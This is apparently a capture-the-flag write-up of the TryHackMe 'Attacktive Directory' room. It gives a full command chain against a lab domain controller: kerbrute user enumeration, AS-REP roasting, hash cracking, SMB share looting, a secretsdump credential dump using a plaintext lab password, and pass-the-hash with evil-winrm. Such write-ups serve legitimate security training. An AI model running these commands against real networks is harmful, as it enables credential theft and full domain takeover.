---
layout: post
title: "Attacktive Directory"
date: 2022-10-06
categories: [Tryhackme, Medium-THM]
tags: [kerbrute, ASREPRoasting, smbclient, evil-winrm, impacket]
image: ../../assets/img/posts/attacktivedirectory.png 

---

## Description

99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller?

|**Room**|[Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Medium|
|**Creator**|[tryhackme](https://tryhackme.com/p/tryhackme)|

---

We will solve this room from THM, [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)

Starting off with deploying the machine and quickly scanning the open ports with rustscan,

```bash
rustscan -a 10.10.65.231 --ulimit 5000
```

![image](https://user-images.githubusercontent.com/67465230/187017396-73b84f2e-517c-4836-b6c2-5a6eed4bb78f.png)

We got the open ports and now we can scan them in detail using nmap,

```bash
sudo nmap -sCVS -p53,80,88,135,139,445,389,464,593,636,3269,3268,9389,47001 10.10.65.231 -oN nmap.log
```

![image](https://user-images.githubusercontent.com/67465230/187017414-6656d00d-a4e3-430d-bdd4-bbdc6ee22196.png)

Result scan shows that port 53 is running DNS service, port 80 is running MS IIS server, port 88 is running kerberos service, port 139,445 is running SMB service, port 389,3268 is running LDAP. 

To avoid DNS resolving issues, better to add domain name in /etc/hosts file at start,

```bash
echo "10.10.25.31    spookeysec.local" >> /etc/hosts
```

Now, we can use **kerbrute** tool to enumerate users from kerberos service (Kerberos is a key authentication service within Active Directory),

```bash
kerbrute userenum --dc spookysec.local -d "spookysec.local" userlist.txt -t 100 -o kerbrute.log
```

![image](https://user-images.githubusercontent.com/67465230/194377172-b9675724-f5f4-45e7-a566-b84fa2b06c15.png)

As the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** 

>ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Let's retrieve Kerberos Tickets using [Impacket](https://github.com/SecureAuthCorp/impacket) tool called **GetNPUsers.py**, which will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

Let's take a look at help option on how we can run this tool,

```bash
python3 /home/kali/impacket/examples/GetNPUsers.py
```

![image](https://user-images.githubusercontent.com/67465230/187017433-6fac2df9-e7f3-4365-a537-c91d74e96e45.png)

Now, since we have 2 accounts that we could potentially query a ticket from. So let's use **svc-admin** username to query a ticket from with no password,

```bash
python3 /home/kali/impacket/examples/GetNPUsers.py -dc-ip 10.10.25.31 spookysec.local/svc-admin -no-pass
```

![image](https://user-images.githubusercontent.com/67465230/194377270-a9904ef2-a759-45d8-84c8-592635a22fcd.png)

we got the hash, YAY!!

Looking at the Hashcat Examples Wiki page, the hash type we retrieve from the KDC is **Kerberos 5 AS-REP etype 23** (mode 18200). 

Let's use hashcat to crack this hash, 

```bash
hashcat.exe -m 18200 crack.txt rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/194377397-fa30da8b-8205-4ec9-82b0-772bcfab1cd8.png)

Now that we got the credentials for svc-admin user, we can try to list shares from SMB service using same user (svc-admin),

```bash
smbclient -L \\\\10.10.25.31\\ -U "*********"
```

![image](https://user-images.githubusercontent.com/67465230/194377477-9378496d-86a9-465d-9d8f-e8f41cc29ca0.png)

we can see that there is a backup shares lying around on the network. 

Let's get our hands dirty by getting into the share,

```bash
smbclient \\\\10.10.25.31\\backup -U "*********"
```

![image](https://user-images.githubusercontent.com/67465230/194377591-9efa6674-ec39-4f17-a11c-8487441e199d.png)

enumerating the share and we see the backup_credentials.txt file.

Let's download the file on our system,

```bash
get backup_credentials.txt
```

![image](https://user-images.githubusercontent.com/67465230/187017484-e88b598d-6d26-4979-a7a2-c54c1e7bd894.png)

Reading the content of the file and we see the gibberish data,

![image](https://user-images.githubusercontent.com/67465230/194377772-01abfb48-f136-4e2e-b407-efff18eb5f97.png)

To decode this gibberish data, we will use [CyberChef](https://gchq.github.io/CyberChef/),

![image](https://user-images.githubusercontent.com/67465230/194377849-d428b236-2c99-414f-ac5c-5d122ddbb28c.png)

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets me thinking, What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes.

Knowing this, let's use another tool within Impacket called **secretsdump.py**, which will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. By exploiting this, we will effectively have full control over the AD Domain.

Let's look at how we can run this tool,

```bash
python3 /home/kali/impacket/examples/secretsdump.py
```

![image](https://user-images.githubusercontent.com/67465230/187017507-84a4b9ff-5405-4d6c-901c-c72ada6a90d2.png)

Now that we know how to run this tool, we can run the tool and dump the secrets (hashes),

```bash
python3 /home/kali/impacket/examples/secretsdump.py -dc-ip 10.10.25.31 backup:backup2517860@spookysec.local
```

![image](https://user-images.githubusercontent.com/67465230/194378123-a8577986-5df2-456d-b9aa-57c037427045.png)
![image](https://user-images.githubusercontent.com/67465230/194378134-deedcee3-6cdf-42b5-9cc1-7e01215968df.png)

secretsdump.py uses DRSUAPI method to dump **NTDS.DIT** (a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users).

By this, we now have Administrators NTLM hash. Now, since we have Administrator user hash, we can perform **Pass The Hash** attack, which will allow us to authenticate as the user without the password. 

For this attack, we need to use **evil-winrm** tool. It doesn't come pre-installed in kali but we can install it using,

```bash
sudo gem install evil-winrm
```

Now, we can see the usage of this tool,

```bash
evil-winrm -h
```

![image](https://user-images.githubusercontent.com/67465230/187017532-51070490-54e0-47d9-9b6f-118a59e8e6ce.png)

Now, after checking the tool usage, we can commence the attack,

```bash
evil-winrm -i 10.10.25.31 -u Administrator -H ********************************
```

![image](https://user-images.githubusercontent.com/67465230/187017543-7b021fd7-d805-4ca9-b703-026c3820ba0e.png)

we'll get the Administrator user access!!

Now, navigating to svc-admin, backup & Administrator user's Desktop directory, we can find the respective user flags.